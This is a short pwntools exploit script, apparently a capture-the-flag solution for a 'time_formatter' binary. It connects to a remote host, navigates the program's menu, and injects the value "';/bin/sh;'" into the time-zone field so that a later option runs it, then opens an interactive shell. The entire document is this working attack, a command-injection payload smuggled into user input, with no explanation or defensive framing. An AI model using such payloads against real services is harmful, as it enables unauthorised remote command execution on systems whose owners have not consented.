from pwn import *
context.log_level = 'debug'

r = remote('111.198.29.45', 48889)
#r = process('./time_formatter')

r.recvuntil(">")
r.sendline("1")

r.recvuntil("Format: ")
r.sendline("abc")

r.recvuntil(">")
r.sendline("5")

r.recvuntil("?")
r.sendline("N")

r.recvuntil(">")
r.sendline("3")

r.recvuntil("Time zone: ")
r.sendline("';/bin/sh;'")

r.recvuntil(">")
r.sendline("4")



r.interactive()



